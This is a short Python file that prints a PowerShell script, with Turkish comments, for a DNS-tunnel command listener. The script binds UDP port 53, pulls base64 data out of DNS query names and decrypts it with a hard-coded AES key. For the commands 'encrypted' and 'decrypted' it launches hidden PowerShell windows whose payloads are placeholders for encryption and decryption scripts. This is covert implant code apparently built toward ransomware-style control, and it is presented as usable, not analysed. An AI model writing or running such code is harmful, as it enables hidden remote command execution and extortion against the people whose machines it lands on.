x = """# AES Parametreleri
$key = [System.Text.Encoding]::UTF8.GetBytes("sifre123sifre123sifre123sifre12")
$iv = New-Object Byte[] 16

# AES Şifre Çöz
function Decrypt-AES {
    param($encBytes)

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = "CBC"
    $aes.Padding = "PKCS7"
    $aes.Key = $key
    $aes.IV = $iv

    $decryptor = $aes.CreateDecryptor()
    $plaintext = $decryptor.TransformFinalBlock($encBytes, 0, $encBytes.Length)
    return [System.Text.Encoding]::UTF8.GetString($plaintext)
}

# DNS Query'den Komut Ayıkla
function Parse-DNSQuery {
    param([Byte[]]$data)

    $i = 12
    $domainParts = @()
    $length = $data[$i]
    while ($length -ne 0) {
        $i++
        $part = [System.Text.Encoding]::ASCII.GetString($data[$i..($i + $length - 1)])
        $domainParts += $part
        $i += $length
        $length = $data[$i]
    }
    return ($domainParts -join ".")
}

# UDP Dinleme ve Komut Bekleme
$udp = New-Object System.Net.Sockets.UdpClient 53
$remoteEP = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any, 0)

Write-Host "DNS tünel dinlemesi başlatıldı (Port 53)..."

while ($true) {
    $recv = $udp.Receive([ref]$remoteEP)
    try {
        $domain = Parse-DNSQuery -data $recv
        Write-Host "DNS Sorgusu: $domain"

        $b64 = $domain.Split(".")[0]
        $encryptedBytes = [System.Convert]::FromBase64String($b64)
        $msg = Decrypt-AES $encryptedBytes

        Write-Host "Çözülen mesaj: $msg"

        if ($msg.ToLower() -eq "encrypted") {
            Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"Şifreleme scripti buraya`""
        } elseif ($msg.ToLower() -eq "decrypted") {
            Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"Çözme scripti buraya`""
        } else {
            Write-Host "Bilinmeyen komut alındı."
        }

    } catch {
        Write-Host "Çözümleme hatası: $_"
    }
}
"""
print(x)